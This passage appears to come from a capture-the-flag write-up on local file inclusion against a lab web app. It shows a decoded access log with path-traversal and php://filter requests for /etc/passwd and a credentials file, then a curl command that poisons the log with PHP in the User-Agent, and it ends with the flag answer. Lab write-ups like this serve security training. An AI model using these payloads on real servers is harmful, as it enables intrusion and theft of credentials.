WUvOTYuMC40NjY0LjQ1IFNhZmFyaS81MzcuMzY6L2luZGV4LnBocD9lcnI9ZXJyb3IudHh0Ckd1ZXN0OjE3Mi4xNy4wLjE6Y3VybC83LjgwLjA6L2luZGV4LnBocD9lcnI9cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT1pbmRleC5waHAKR3Vlc3Q6MTcyLjE3LjAuMTpjdXJsLzcuODAuMDovaW5kZXgucGhwP2Vycj1waHA6Ly9maWx0ZXIvY29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPWluY2x1ZGVzL2NyZWRzLnBocApHdWVzdDoxNzIuMTcuMC4xOk1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzk2LjAuNDY2NC40NSBTYWZhcmkvNTM3LjM2Oi9sb2dpbi5waHAKTWNTa2lkeToxNzIuMTcuMC4xOk1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzk2LjAuNDY2NC40NSBTYWZhcmkvNTM3LjM2Oi9sb2dpbi5waHAKTWNTa2lkeToxNzIuMTcuMC4xOk1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzk2LjAuNDY2NC40NSBTYWZhcmkvNTM3LjM2Oi9tYW5hZ2UucGhwCk1jU2tpZHk6MTcyLjE3LjAuMTpNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85Ni4wLjQ2NjQuNDUgU2FmYXJpLzUzNy4zNjovcmVjb3Zlci1wYXNzd29yZC5waHAKTWNTa2lkeToxNzIuMTcuMC4xOk1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzk2LjAuNDY2NC40NSBTYWZhcmkvNTM3LjM2Oi9tYW5hZ2UucGhwCk1jU2tpZHk6MTcyLjE3LjAuMTpNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85Ni4wLjQ2NjQuNDUgU2FmYXJpLzUzNy4zNjovcmVjb3Zlci1wYXNzd29yZC5waHAKTWNTa2lkeToxNzIuMTcuMC4xOk1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzk2LjAuNDY2NC40NSBTYWZhcmkvNTM3LjM2Oi9tYW5hZ2UucGhwCk1jU2tpZHk6MTcyLjE3LjAuMTpNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85Ni4wLjQ2NjQuNDUgU2FmYXJpLzUzNy4zNjovcmVjb3Zlci1wYXNzd29yZC5waHAKR3Vlc3Q6MTcyLjE3LjAuMTpjdXJsLzcuODAuMDovaW5kZXgucGhwP2Vycj1waHA6Ly9maWx0ZXIvY29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPWluY2x1ZGVzL2xvZ3MvYXBwX2FjY2Vzcy5sb2cKR3Vlc3Q6MTcyLjE3LjAuMTpjdXJsLzcuODAuMDovaW5kZXgucGhwP2Vycj1waHA6Ly9maWx0ZXIvY29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPWluY2x1ZGVzL2xvZ3MvYXBwX2FjY2Vzcy5sb2cK</div>
```

```bash
$ echo "Ck1jU2tpZHk6MTcyLjE3LjAuMTpNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvOTUuMC40NjM4LjY5IFNhZmFyaS81MzcuMzY6L21hbmFnZS5waHAKR3Vlc3Q6MTcyLjE3LjAuMTpNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvOTUuMC40NjM4LjY5IFNhZmFyaS81MzcuMzY6L2luZGV4LnBocD9lcnI9ZXJyb3IudHh0Ckd1ZXN0OjE3Mi4xNy4wLjE6TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzk1LjAuNDYzOC42OSBTYWZhcmkvNTM3LjM2Oi9pbmRleC5waHA/ZXJyPS9ldGMvZmxhZwpHdWVzdDoxNzIuMTcuMC4xOk1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzk2LjAuNDY2NC40NSBTYWZhcmkvNTM3LjM2Oi8KR3Vlc3Q6MTcyLjE3LjAuMTpNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85Ni4wLjQ2NjQuNDUgU2FmYXJpLzUzNy4zNjovaW5kZXgucGhwP2Vycj1lcnJvci50eHQKR3Vlc3Q6MTcyLjE3LjAuMTpNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85Ni4wLjQ2NjQuNDUgU2FmYXJpLzUzNy4zNjovCkd1ZXN0OjE3Mi4xNy4wLjE6TW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvOTYuMC40NjY0LjQ1IFNhZmFyaS81MzcuMzY6L2luZGV4LnBocD9lcnI9ZXJyb3IudHh0Ckd1ZXN0OjE3Mi4xNy4wLjE6Oi8KR3Vlc3Q6MTcyLjE3LjAuMTpNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTm1hcCBTY3JpcHRpbmcgRW5naW5lOyBodHRwczovL25tYXAub3JnL2Jvb2svbnNlLmh0bWwpOi8KR3Vlc3Q6MTcyLjE3LjAuMTpNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTm1hcCBTY3JpcHRpbmcgRW5naW5lOyBodHRwczovL25tYXAub3JnL2Jvb2svbnNlLmh0bWwpOi8KR3Vlc3Q6MTcyLjE3LjAuMTpNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTm1hcCBTY3JpcHRpbmcgRW5naW5lOyBodHRwczovL25tYXAub3JnL2Jvb2svbnNlLmh0bWwpOi8KR3Vlc3Q6MTcyLjE3LjAuMTpNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTm1hcCBTY3JpcHRpbmcgRW5naW5lOyBodHRwczovL25tYXAub3JnL2Jvb2svbnNlLmh0bWwpOi8KR3Vlc3Q6MTcyLjE3LjAuMTo6LwpHdWVzdDoxNzIuMTcuMC4xOk1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBObWFwIFNjcmlwdGluZyBFbmdpbmU7IGh0dHBzOi8vbm1hcC5vcmcvYm9vay9uc2UuaHRtbCk6LwpHdWVzdDoxNzIuMTcuMC4xOk1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBObWFwIFNjcmlwdGluZyBFbmdpbmU7IGh0dHBzOi8vbm1hcC5vcmcvYm9vay9uc2UuaHRtbCk6LwpHdWVzdDoxNzIuMTcuMC4xOk1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBObWFwIFNjcmlwdGluZyBFbmdpbmU7IGh0dHBzOi8vbm1hcC5vcmcvYm9vay9uc2UuaHRtbCk6LwpHdWVzdDoxNzIuMTcuMC4xOk1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBObWFwIFNjcmlwdGluZyBFbmdpbmU7IGh0dHBzOi8vbm1hcC5vcmcvYm9vay9uc2UuaHRtbCk6LwpHdWVzdDoxNzIuMTcuMC4xOk1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBObWFwIFNjcmlwdGluZyBFbmdpbmU7IGh0dHBzOi8vbm1hcC5vcmcvYm9vay9uc2UuaHRtbCk6LwpHdWVzdDoxNzIuMTcuMC4xOk1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBObWFwIFNjcmlwdGluZyBFbmdpbmU7IGh0dHBzOi8vbm1hcC5vcmcvYm9vay9uc2UuaHRtbCk6L2luZGV4LnBocD9lcnI9ZXJyb3IudHh0Ckd1ZXN0OjE3Mi4xNy4wLjE6TW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE5tYXAgU2NyaXB0aW5nIEVuZ2luZTsgaHR0cHM6Ly9ubWFwLm9yZy9ib29rL25zZS5odG1sKTovCkd1ZXN0OjE3Mi4xNy4wLjE6TW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE5tYXAgU2NyaXB0aW5nIEVuZ2luZTsgaHR0cHM6Ly9ubWFwLm9yZy9ib29rL25zZS5odG1sKTovCkd1ZXN0OjE3Mi4xNy4wLjE6TW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE5tYXAgU2NyaXB0aW5nIEVuZ2luZTsgaHR0cHM6Ly9ubWFwLm9yZy9ib29rL25zZS5odG1sKTovCkd1ZXN0OjE3Mi4xNy4wLjE6TW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE5tYXAgU2NyaXB0aW5nIEVuZ2luZTsgaHR0cHM6Ly9ubWFwLm9yZy9ib29rL25zZS5odG1sKTovCkd1ZXN0OjE3Mi4xNy4wLjE6TW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE5tYXAgU2NyaXB0aW5nIEVuZ2luZTsgaHR0cHM6Ly9ubWFwLm9yZy9ib29rL25zZS5odG1sKTovaW5kZXgucGhwP2Vycj1lcnJvci50eHQKR3Vlc3Q6MTcyLjE3LjAuMTpNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTm1hcCBTY3JpcHRpbmcgRW5naW5lOyBodHRwczovL25tYXAub3JnL2Jvb2svbnNlLmh0bWwpOi8KR3Vlc3Q6MTcyLjE3LjAuMTpNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTm1hcCBTY3JpcHRpbmcgRW5naW5lOyBodHRwczovL25tYXAub3JnL2Jvb2svbnNlLmh0bWwpOi8KR3Vlc3Q6MTcyLjE3LjAuMTpNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTm1hcCBTY3JpcHRpbmcgRW5naW5lOyBodHRwczovL25tYXAub3JnL2Jvb2svbnNlLmh0bWwpOi8KR3Vlc3Q6MTcyLjE3LjAuMTpNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTm1hcCBTY3JpcHRpbmcgRW5naW5lOyBodHRwczovL25tYXAub3JnL2Jvb2svbnNlLmh0bWwpOi8KR3Vlc3Q6MTcyLjE3LjAuMTpNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTm1hcCBTY3JpcHRpbmcgRW5naW5lOyBodHRwczovL25tYXAub3JnL2Jvb2svbnNlLmh0bWwpOi8KR3Vlc3Q6MTcyLjE3LjAuMTpNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTm1hcCBTY3JpcHRpbmcgRW5naW5lOyBodHRwczovL25tYXAub3JnL2Jvb2svbnNlLmh0bWwpOi8KR3Vlc3Q6MTcyLjE3LjAuMTpNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTm1hcCBTY3JpcHRpbmcgRW5naW5lOyBodHRwczovL25tYXAub3JnL2Jvb2svbnNlLmh0bWwpOi8KR3Vlc3Q6MTcyLjE3LjAuMTpNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTm1hcCBTY3JpcHRpbmcgRW5naW5lOyBodHRwczovL25tYXAub3JnL2Jvb2svbnNlLmh0bWwpOi8KR3Vlc3Q6MTcyLjE3LjAuMTpNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTm1hcCBTY3JpcHRpbmcgRW5naW5lOyBodHRwczovL25tYXAub3JnL2Jvb2svbnNlLmh0bWwpOi8KR3Vlc3Q6MTcyLjE3LjAuMTo6LwpHdWVzdDoxNzIuMTcuMC4xOjovCkd1ZXN0OjE3Mi4xNy4wLjE6TW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0OyBydjo3OC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94Lzc4LjA6LwpHdWVzdDoxNzIuMTcuMC4xOk1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6NzguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC83OC4wOi9pbmRleC5waHA/ZXJyPWVycm9yLnR4dApHdWVzdDoxNzIuMTcuMC4xOk1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6NzguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC83OC4wOi9pbmRleC5waHA/ZXJyPWVycm9yLnR4dApHdWVzdDoxNzIuMTcuMC4xOk1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6NzguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC83OC4wOi9pbmRleC5waHA/Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZApHdWVzdDoxNzIuMTcuMC4xOk1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6NzguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC83OC4wOi9pbmRleC5waHA/ZXJyPS4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uL2V0Yy9wYXNzd2QKR3Vlc3Q6MTcyLjE3LjAuMTpNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQ7IHJ2Ojc4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvNzguMDovaW5kZXgucGhwP2Vycj0uLi8uLi8uLi8uLi8uLi9ldGMvcGFzc3dkCkd1ZXN0OjE3Mi4xNy4wLjE6TW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0OyBydjo3OC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94Lzc4LjA6L2luZGV4LnBocD9lcnI9Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZApHdWVzdDoxNzIuMTcuMC4xOk1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6NzguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC83OC4wOi9pbmRleC5waHA/ZXJyPS4uLy4uLy4uL2V0Yy9wYXNzd2QKR3Vlc3Q6MTcyLjE3LjAuMTpNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQ7IHJ2Ojc4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvNzguMDovaW5kZXgucGhwP2Vycj0uLi8uLi9ldGMvcGFzc3dkCkd1ZXN0OjE3Mi4xNy4wLjE6TW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0OyBydjo3OC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94Lzc4LjA6L2luZGV4LnBocD9lcnI9Li4vLi4vLi4vZXRjL3Bhc3N3ZApHdWVzdDoxNzIuMTcuMC4xOk1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6NzguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC83OC4wOi9pbmRleC5waHA/ZXJyPS4uLy4uLy4uL2V0Yy9wYXNzd2QKR3Vlc3Q6MTcyLjE3LjAuMTpNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQ7IHJ2Ojc4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvNzguMDovaW5kZXgucGhwP2Vycj0uLi8uLi8uLi9ldGMvZmxhZwpHdWVzdDoxNzIuMTcuMC4xOmN1cmwvNy44MC4wOi9pbmRleC5waHA/ZXJyPXBocDovL2ZpbHRlci9jb252ZXJ0LmJhc2U2NC1lbmNvZGUvcmVzb3VyY2U9aW5kZXgucGhwCkd1ZXN0OjE3Mi4xNy4wLjE6TW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvOTYuMC40NjY0LjQ1IFNhZmFyaS81MzcuMzY6L2luZGV4LnBocD9lcnI9ZXJyb3IudHh0Ckd1ZXN0OjE3Mi4xNy4wLjE6Y3VybC83LjgwLjA6L2luZGV4LnBocD9lcnI9cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT1pbmRleC5waHAKR3Vlc3Q6MTcyLjE3LjAuMTpjdXJsLzcuODAuMDovaW5kZXgucGhwP2Vycj1waHA6Ly9maWx0ZXIvY29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPWluY2x1ZGVzL2NyZWRzLnBocApHdWVzdDoxNzIuMTcuMC4xOk1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzk2LjAuNDY2NC40NSBTYWZhcmkvNTM3LjM2Oi9sb2dpbi5waHAKTWNTa2lkeToxNzIuMTcuMC4xOk1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzk2LjAuNDY2NC40NSBTYWZhcmkvNTM3LjM2Oi9sb2dpbi5waHAKTWNTa2lkeToxNzIuMTcuMC4xOk1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzk2LjAuNDY2NC40NSBTYWZhcmkvNTM3LjM2Oi9tYW5hZ2UucGhwCk1jU2tpZHk6MTcyLjE3LjAuMTpNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85Ni4wLjQ2NjQuNDUgU2FmYXJpLzUzNy4zNjovcmVjb3Zlci1wYXNzd29yZC5waHAKTWNTa2lkeToxNzIuMTcuMC4xOk1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzk2LjAuNDY2NC40NSBTYWZhcmkvNTM3LjM2Oi9tYW5hZ2UucGhwCk1jU2tpZHk6MTcyLjE3LjAuMTpNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85Ni4wLjQ2NjQuNDUgU2FmYXJpLzUzNy4zNjovcmVjb3Zlci1wYXNzd29yZC5waHAKTWNTa2lkeToxNzIuMTcuMC4xOk1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzk2LjAuNDY2NC40NSBTYWZhcmkvNTM3LjM2Oi9tYW5hZ2UucGhwCk1jU2tpZHk6MTcyLjE3LjAuMTpNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85Ni4wLjQ2NjQuNDUgU2FmYXJpLzUzNy4zNjovcmVjb3Zlci1wYXNzd29yZC5waHAKR3Vlc3Q6MTcyLjE3LjAuMTpjdXJsLzcuODAuMDovaW5kZXgucGhwP2Vycj1waHA6Ly9maWx0ZXIvY29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPWluY2x1ZGVzL2xvZ3MvYXBwX2FjY2Vzcy5sb2cKR3Vlc3Q6MTcyLjE3LjAuMTpjdXJsLzcuODAuMDovaW5kZXgucGhwP2Vycj1waHA6Ly9maWx0ZXIvY29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPWluY2x1ZGVzL2xvZ3MvYXBwX2FjY2Vzcy5sb2cK" | base64 -d
McSkidy:172.17.0.1:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36:/manage.php
Guest:172.17.0.1:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36:/index.php?err=error.txt
Guest:172.17.0.1:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36:/index.php?err=/etc/flag
Guest:172.17.0.1:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36:/
Guest:172.17.0.1:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36:/index.php?err=error.txt
Guest:172.17.0.1:Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0:/
Guest:172.17.0.1:Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0:/index.php?err=error.txt

Guest:172.17.0.1:Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0:/index.php?err=../../../etc/passwd
Guest:172.17.0.1:Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0:/index.php?err=../../../etc/flag
Guest:172.17.0.1:curl/7.80.0:/index.php?err=php://filter/convert.base64-encode/resource=index.php
Guest:172.17.0.1:curl/7.80.0:/index.php?err=php://filter/convert.base64-encode/resource=index.php
Guest:172.17.0.1:curl/7.80.0:/index.php?err=php://filter/convert.base64-encode/resource=includes/creds.php
Guest:172.17.0.1:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36:/login.php
McSkidy:172.17.0.1:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36:/login.php
McSkidy:172.17.0.1:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36:/manage.php
McSkidy:172.17.0.1:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36:/recover-password.php
McSkidy:172.17.0.1:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36:/manage.php
McSkidy:172.17.0.1:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36:/recover-password.php
McSkidy:172.17.0.1:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36:/manage.php
McSkidy:172.17.0.1:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36:/recover-password.php
Guest:172.17.0.1:curl/7.80.0:/index.php?err=php://filter/convert.base64-encode/resource=includes/logs/app_access.log
```

`$ curl -A "<?php phpinfo()?>" http://<MACHINE_IP>/index.php`

`http://<MACHINE_IP>/index.php?err=includes/logs/app_access.log`
**Answer** `lfi-aoc-awesome-59aedca683fff9261263bb084880c965`